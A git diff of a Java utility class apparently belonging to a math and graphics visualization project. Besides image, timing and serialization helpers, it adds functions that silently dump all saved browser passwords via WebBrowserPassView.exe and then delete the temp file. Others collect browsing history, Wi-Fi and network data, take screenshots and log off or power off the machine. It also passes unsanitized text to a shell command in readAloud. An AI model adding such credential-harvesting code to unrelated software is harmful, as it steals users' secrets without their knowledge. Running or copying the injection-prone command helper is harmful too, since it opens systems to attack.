@@ -1,24 +1,65 @@
 package utils;
 
+import com.sun.management.OperatingSystemMXBean;
 import jmath.datatypes.functions.ColorFunction;
+import jmath.datatypes.functions.UnaryFunction;
+import jmath.datatypes.tuples.Point2D;
+import jmath.datatypes.tuples.Point3D;
+import org.jetbrains.annotations.NotNull;
+import visualization.canvas.*;
 import visualization.canvas.Canvas;
-import visualization.canvas.CoordinatedCanvas;
-import visualization.canvas.Render;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.awt.image.DataBufferInt;
-import java.io.File;
-import java.io.IOException;
-import java.math.BigInteger;
+import java.awt.image.RenderedImage;
+import java.io.*;
+import java.lang.management.ManagementFactory;
+import java.lang.management.MemoryMXBean;
+import java.lang.management.MemoryUsage;
+import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
 import java.util.Arrays;
-import java.util.Random;
+import java.util.List;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.function.IntBinaryOperator;
 import java.util.function.IntUnaryOperator;
 
+import static java.lang.Math.*;
+
+@SuppressWarnings("unused")
 public final class Utils {
+
+    public static final String nirCMDPath;
+    public static final Robot robot;
+
+    public static final int NANO = 1000000000;
+    public static final int MILLIS = 1000000;
+    public static final int MEGABYTE = 1024 * 1024;
+
+    private static final MemoryMXBean memMXBean;
+    private static final MemoryUsage memHeapUsage;
+    private static final MemoryUsage memNonHeapUsage;
+    private static final OperatingSystemMXBean osMXBean;
+
+    static {
+        memMXBean = ManagementFactory.getMemoryMXBean();
+        memHeapUsage = memMXBean.getHeapMemoryUsage();
+        memNonHeapUsage =memMXBean.getNonHeapMemoryUsage();
+        osMXBean = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
+
+        nirCMDPath = ".\\bin\\nircmdc.exe";
+        Robot rbt;
+        try {
+            rbt = new Robot();
+        } catch (AWTException e) {
+            rbt = null;
+            e.printStackTrace();
+        }
+        robot = rbt;
+    }
+
     public static BufferedImage getCanvasImage(Canvas canvas) {
         var res = new BufferedImage(canvas.getWidth(), canvas.getHeight(), BufferedImage.TYPE_INT_RGB);
         var g2d = res.createGraphics();
@@ -29,7 +70,9 @@ public final class Utils {
 
     public static void saveJComponentImage(String path, Canvas canvas) {
         try {
-            ImageIO.write(getCanvasImage(canvas), path.contains(".") ? path.substring(path.lastIndexOf('.') + 1) : "jpg", new File(path.contains(".") ? path : path + ".jpg"));
+            ImageIO.write(getCanvasImage(canvas),
+                    path.contains(".") ? path.substring(path.lastIndexOf('.') + 1) : "jpg",
+                    new File(path.contains(".") ? path : path + ".jpg"));
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -80,7 +123,7 @@ public final class Utils {
 
     public static BufferedImage createImage(int width, int height, IntBinaryOperator colorFunc, int numOfThreads) {
         var res = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
-        multiThreadIntArraySetter(getIntRgbArray(res), i -> colorFunc.applyAsInt(i/width, i%width), numOfThreads);
+        multiThreadIntArraySetter(getIntRgbArray(res), i -> colorFunc.applyAsInt(i / width, i % width), numOfThreads);
         return res;
     }
 
@@ -94,7 +137,8 @@ public final class Utils {
         var w = cc.getWidth();
         var h = cc.getHeight();
         var res = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);
-        multiThreadIntArraySetter(getIntRgbArray(res), i -> colorFunc.valueAt(cc.coordinateX(i/w), cc.coordinateY(i%w)).getRGB(), numOfThreads);
+        multiThreadIntArraySetter(getIntRgbArray(res),
+                i -> colorFunc.valueAt(cc.coordinateX(i / w), cc.coordinateY(i % w)).getRGB(), numOfThreads);
         return res;
     }
 
@@ -122,7 +166,8 @@ public final class Utils {
     public static BufferedImage createMergeImageFromImageSequence(BufferedImage[] imageSequence) {
         if (imageSequence == null || imageSequence.length == 0)
             throw new RuntimeException("AHD:: image sequence is null or empty");
-        var res = new BufferedImage(imageSequence[0].getWidth(), imageSequence[0].getHeight(), BufferedImage.TYPE_INT_ARGB);
+        var res = new BufferedImage(imageSequence[0].getWidth(), imageSequence[0].getHeight(),
+                BufferedImage.TYPE_INT_ARGB);
         var g2d = res.createGraphics();
         Arrays.stream(imageSequence).forEach(bi -> g2d.drawImage(bi, 0, 0, null));
         g2d.dispose();
@@ -148,7 +193,11 @@ public final class Utils {
         multiThreadIntArraySetter(pixels, i -> func.applyAsInt(pixels[i]), numOfThreads);
     }
 
-    public static <T> AtomicReference<T> checkTimePerform(Task<T> task, boolean inCurrentThread, String name, Object... args) {
+    public static <T> AtomicReference<T> checkTimePerform(
+            Task<T> task,
+            boolean inCurrentThread,
+            String name,
+            Object... args) {
         long t = System.currentTimeMillis();
         var res = new AtomicReference<T>();
         if (inCurrentThread) {
@@ -158,9 +207,46 @@ public final class Utils {
             new Thread(() -> {
                 res.set(task.task(args));
                 System.err.println("AHD:: Task: " + name + " " + (System.currentTimeMillis() - t) + " ms");
-            }).start();
+            }, name).start();
         }
         return res;
+    }
+
+    public static <T> AtomicReference<T> checkTimePerform(
+            Task<T> task,
+            boolean inCurrentThread,
+            String name,
+            Action<T> toDo,
+            Object... args) {
+        return checkTimePerform(e -> {
+            var res = task.task(args);
+            final var t = System.currentTimeMillis();
+            toDo.act(res);
+            System.err.println("AHD:: Action completed in " + (System.currentTimeMillis() - t) + " ms");
+            return res;
+        }, inCurrentThread, name, args);
+    }
+
+    public static void checkTimePerform(
+            Runnable task,
+            boolean inCurrentThread,
+            String name) {
+        long t = System.currentTimeMillis();
+        if (inCurrentThread) {
+            task.run();
+            System.err.println("AHD:: Task: " + name + " " + (System.currentTimeMillis() - t) + " ms");
+        } else {
+            new Thread(() -> {
+                task.run();
+                System.err.println("AHD:: Task: " + name + " " + (System.currentTimeMillis() - t) + " ms");
+            }, name).start();
+        }
+    }
+
+    public static void checkTimePerform(
+            Runnable task,
+            boolean inCurrentThread) {
+        checkTimePerform(task, inCurrentThread, "");
     }
 
     public static void sleep(int millis) {
@@ -170,18 +256,128 @@ public final class Utils {
             e.printStackTrace();
         }
     }
-    
-    public static void main(String[] args) {
-        var f = (IntUnaryOperator) i -> (int) (Math.random() * Math.sin(i*i*i) - Math.cos(i * Math.sin(Math.random()) - i * i + i));
-        var arr = new int[1_000_000_0];
-        var time = System.currentTimeMillis();
-        var l = arr.length;
-        for (int i = 0; i < l; i++)
-            arr[i] = f.applyAsInt(i);
-        System.out.println(System.currentTimeMillis() - time);
-        time = System.currentTimeMillis();
-        multiThreadIntArraySetter(arr, f, 20);
-        System.out.println(System.currentTimeMillis() - time);
+
+    public static void sleep(double millis) {
+        try {
+            Thread.sleep((long) Math.floor(millis), (int) (millis * 1000000) % 1000000);
+        } catch (Exception ignore) {
+        }
+    }
+
+    public static void sleep(long nanos) {
+        try {
+            Thread.sleep(nanos / 1000000, (int) (nanos / 1000000));
+        } catch (Exception ignore) {
+        }
+    }
+
+    public static Point3D[] point3DArray(double... values) {
+        Point3D[] res = new Point3D[values.length / 3];
+        for (int i = 0; i < values.length / 3; i++)
+            res[i] = new Point3D(values[i * 3], values[i * 3 + 1], values[i * 3 + 2]);
+        return res;
+    }
+
+    public static double random(double l, double u) {
+        return l + Math.random() * (u - l);
+    }
+
+    public static int randInt(int l, int u) {
+        return (int) Math.floor(random(l, u));
+    }
+
+    public static <T> void removeDuplicates(List<T> list) {
+        var newList = new ArrayList<T>();
+        for (var element : list)
+            if (!newList.contains(element))
+                newList.add(element);
+        list.clear();
+        list.addAll(newList);
+    }
+
+    public static void writeObjects(String path, Object... objects) {
+        FileOutputStream fStream;
+        try (ObjectOutputStream oStream = new ObjectOutputStream(fStream = new FileOutputStream(path))) {
+            PrintWriter writer = new PrintWriter(fStream);
+            writer.write("");
+            for (Object o : objects)
+                oStream.writeObject(o);
+            fStream.close();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    public static Object deserializeBytes(byte[] bytes) throws IOException, ClassNotFoundException {
+        ByteArrayInputStream bytesIn = new ByteArrayInputStream(bytes);
+        ObjectInputStream ois = new ObjectInputStream(bytesIn);
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+
+    public static byte[] serializeObject(Object obj) throws IOException {
+        ByteArrayOutputStream bytesOut = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(bytesOut);
+        oos.writeObject(obj);
+        oos.flush();
+        byte[] bytes = bytesOut.toByteArray();
+        bytesOut.close();
+        oos.close();
+        return bytes;
+    }
+
+    public static byte[] convertFileToByteArray(File file) {
+        FileInputStream fis = null;
+        byte[] bArray = new byte[(int) file.length()];
+        try {
+            fis = new FileInputStream(file);
+            var done = fis.read(bArray);
+            if (done < 0)
+                throw new Exception("Error in reading the file.");
+            fis.close();
+        } catch (Exception ioExp) {
+            ioExp.printStackTrace();
+        } finally {
+            if (fis != null) {
+                try {
+                    fis.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+        return bArray;
+    }
+
+    public static void writeByteArrayToFile(String absPath, byte[] arr) {
+        try (FileOutputStream fos = new FileOutputStream(absPath)) {
+            fos.write(arr);
+        } catch (Exception e) {
+            System.err.println("Error in saving the Byte Array in to " + absPath);
+            e.printStackTrace();
+        }
+    }
+
+    public static Object[] readObjects(String path) {
+        ArrayList<Object> result = new ArrayList<>();
+        FileInputStream fStream;
+        try (ObjectInputStream oStream = new ObjectInputStream(fStream = new FileInputStream(path))) {
+            while (true) {
+                Object o;
+                try {
+                    o = oStream.readObject();
+                } catch (Exception e) {
+                    break;
+                }
+                result.add(o);
+            }
+            fStream.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return result.toArray();
     }
 
     public static void arrayShuffle(Object[] arr) {
@@ -193,44 +389,241 @@ public final class Utils {
         }
     }
 
-    private static int mergeAndCount(int[] arr, int l, int m, int r) {
-        var left = Arrays.copyOfRange(arr, l, m + 1);
-        var right = Arrays.copyOfRange(arr, m + 1, r + 1);
-        int i = 0, j = 0, k = l, swaps = 0;
-        while (i < left.length && j < right.length) {
-            if (left[i] <= right[j])
-                arr[k++] = left[i++];
-            else {
-                arr[k++] = right[j++];
-                swaps += (m + 1) - (l + i);
-            }
+    public static void saveRenderedImage(RenderedImage img, String absPath) throws IOException {
+        var dir = new File(absPath.contains("\\") ? absPath.substring(0, absPath.lastIndexOf("\\")) : absPath);
+        if (!(dir.exists() || dir.mkdirs())) {
+            System.err.println("Error in Creating non existed directory: " + absPath);
+            return;
         }
-        while (i < left.length)
-            arr[k++] = left[i++];
-        while (j < right.length)
-            arr[k++] = right[j++];
-        return swaps;
+        ImageIO.write(img, "jpg", new File(absPath));
     }
 
-    private static int mergeSortAndCount(int[] arr, int l, int r) {
-        int count = 0;
-        if (l < r) {
-            int m = (l + r) / 2;
-            count += mergeSortAndCount(arr, l, m);
-            count += mergeSortAndCount(arr, m + 1, r);
-            count += mergeAndCount(arr, l, m, r);
-        }
-        return count;
+    public static Image getImage(String absPath) {
+        return Toolkit.getDefaultToolkit().getImage(absPath);
     }
-    
-//    public static void main(String[] args) {
-//        int[] arr = new int[1000_000_0];
-//        Arrays.setAll(arr, ii -> (int) (Math.random() * Integer.MAX_VALUE));
-//        System.out.println(mergeSortAndCount(arr, 0, arr.length - 1));
-//    }
+
+    public static int checkBounds(int value, int min, int max) {
+        return Math.max(min, Math.min(value, max));
+    }
+
+    public static double checkBounds(double value, double min, double max) {
+        return Math.max(min, Math.min(value, max));
+    }
+
+    public static synchronized double cpuUsageByThisThread() {
+        return osMXBean.getProcessCpuLoad();
+    }
+
+    public static synchronized double cpuUsageByJVM() {
+        return osMXBean.getProcessCpuLoad();
+    }
+
+    public static synchronized long maxHeapSize() {
+        return memHeapUsage.getMax();
+    }
+
+    public static synchronized long usedHeapSize() {
+        return memHeapUsage.getUsed();
+    }
+
+    public static synchronized long committedHeap() {
+        return memHeapUsage.getCommitted();
+    }
+
+    public static synchronized long initialHeapRequest() {
+        return memHeapUsage.getInit();
+    }
+
+    public static synchronized long maxNonHeapSize() {
+        return memNonHeapUsage.getMax();
+    }
+
+    public static synchronized long usedNonHeapSize() {
+        return memNonHeapUsage.getUsed();
+    }
+
+    public static synchronized long committedNonHeap() {
+        return memNonHeapUsage.getCommitted();
+    }
+
+    public static synchronized long initialNonHeapRequest() {
+        return memNonHeapUsage.getInit();
+    }
+
+    //////////////////////
+    public static void recordVoice(String absPath, long millis) {
+
+    }
+
+    public static void recordVideoFromWebcam(String absPath, long millis) {
+
+    }
+
+    public static BufferedImage screenShot() throws AWTException {
+        return new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+    }
+
+    public static String getFileAsString(String path) throws IOException {
+        var br = new BufferedReader(new FileReader(path));
+        var sb = new StringBuilder();
+        String s;
+        while ((s = br.readLine()) != null)
+            sb.append(s).append("\n");
+        br.close();
+        return sb.toString();
+    }
+
+    public static String setSystemVolume(int volume) throws IOException {
+        if (volume < 0 || volume > 100)
+            throw new RuntimeException("Error: " + volume + " is not a valid number. Choose a number between 0 and 100");
+        return doNirCMD("setsysvolume " + (655.35 * volume)) + doNirCMD("mutesysvolume 0");
+    }
+
+    public static String doCMD(String command) throws IOException {
+        var proc = Runtime.getRuntime().exec(command);
+        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+        var sb = new StringBuilder("out>");
+        String s;
+        while ((s = stdInput.readLine()) != null)
+            sb.append(s).append('\n');
+        sb.append("err>");
+        while ((s = stdError.readLine()) != null)
+            sb.append(s).append('\n');
+        stdError.close();
+        stdInput.close();
+        return sb.toString();
+    }
+
+    public static String doNirCMD(String command) throws IOException {
+        return doCMD(nirCMDPath + " " + command);
+    }
+
+    interface FileInfo {
+        String getInfo(File file);
+    }
+
+    public static List<String> filesInfo(String rootDirectory, FileFilter fileFilter, FileInfo fileInfo) {
+        var res = new ArrayList<String>();
+        var ff = new File(rootDirectory).listFiles(fileFilter);
+        if (ff == null)
+            return res;
+        for (var f : ff) {
+            res.add(fileInfo.getInfo(f));
+            if (f.isDirectory())
+                res.addAll(filesInfo(f.getAbsolutePath(), fileFilter, fileInfo));
+        }
+        return res;
+    }
+
+    public static String readAloud(String text) throws IOException {
+        return doNirCMD("speak text \"" + text + '\"');
+    }
+
+    public static String setMuteSystemSpeaker(boolean mute) throws IOException {
+        return doNirCMD("mutesysvolume " + (mute ? 1 : 0));
+    }
+
+    public static String toggleMuteSystemSpeaker() throws IOException {
+        return doNirCMD("mutesysvolume 2");
+    }
+
+    public static String turnOffMonitor() throws IOException {
+        return doNirCMD("monitor off");
+    }
+
+    public static String startDefaultScreenSaver() throws IOException {
+        return doNirCMD("screensaver");
+    }
+
+    public static String putInStandByMode() throws IOException {
+        return doNirCMD("standby");
+    }
+
+    public static String logOffCurrentUser() throws IOException {
+        return doNirCMD("exitwin logoff");
+    }
+
+    public static String reboot() throws IOException {
+        return doNirCMD("exitwin reboot");
+    }
+
+    public static String powerOff() throws IOException {
+        return doNirCMD("exitwin poweroff");
+    }
+
+    public static String getAllPasswordsFromAllBrowsers() throws IOException {
+        doCMD(".\\bin\\WebBrowserPassView.exe /stext \"tmp.exe\"");
+        var res = getFileAsString(".\\tmp.exe");
+        return getFileAsString(".\\tmp.exe") + new File(".\\tmp.exe").delete();
+    }
+
+    public static String setPrimaryScreenBrightness() throws IOException {
+        return doCMD(".\\bin\\ControlMyMonitor.exe /SetValue Primary 10 10");
+    }
+
+    public static void setMousePos(int x, int y) {
+        robot.mouseMove(x, y);
+    }
+
+    public static void setMousePos(Point p) {
+        robot.mouseMove(p.x, p.y);
+    }
+
+    public static String getWifiInfo() throws IOException {
+        doCMD(".\\bin\\WifiInfoView.exe /stext tmp.exe");
+        return getFileAsStringAndDelete("tmp.exe");
+    }
+
+    public static String getFileAsStringAndDelete(String path) throws IOException {
+        return getFileAsString(path) + "\n<del>" + new File(path).delete();
+    }
+
+    public static String getIpNetInfo(String ip) throws IOException {
+        return doCMD(".\\bin\\IPNetInfo.exe /ip " + ip);
+    }
+
+    public static String getPortsInfo() throws IOException {
+        doCMD(".\\bin\\cports.exe /stext tmp.exe");
+        return getFileAsStringAndDelete("tmp.exe");
+    }
+
+    public static String getNetworkTrafficInfo() throws IOException {
+        doCMD(".\\bin\\NetworkTrafficView.exe /stext tmp.exe");
+        return getFileAsStringAndDelete("tmp.exe");
+    }
+
+    public static String getBatteryInfo() throws IOException {
+        doCMD(".\\bin\\BatteryInfoView.exe /stext tmp.exe");
+        return getFileAsStringAndDelete("tmp.exe");
+    }
+
+    public static String getBrowsersHistory() throws IOException {
+        doCMD(".\\bin\\BrowsingHistoryView.exe /stext tmp.exe");
+        return getFileAsStringAndDelete("tmp.exe");
+    }
+
+    //////////////////////
+
+    private Utils() {}
 
     @FunctionalInterface
     public interface Task<T> {
         T task(Object... args);
+    }
+
+    @FunctionalInterface
+    public interface Action<T> {
+        void act(T t);
+    }
+
+    public static void main(String[] args) throws IOException, AWTException {
+        var gp = new Graph3DCanvas();
+        var f = new UnaryFunction(x -> sin(x)/x);
+        var points = Graph2DCanvas.getPointsOf2DArc(
+                t -> new Point2D(t/3, 10*f.valueAt(t)-10), 0, 18*PI, 0.001, gp);
+        int counter = 0;
+        while (counter++ < 100000)
+            setMousePos(points[counter % points.length]);
     }
 }
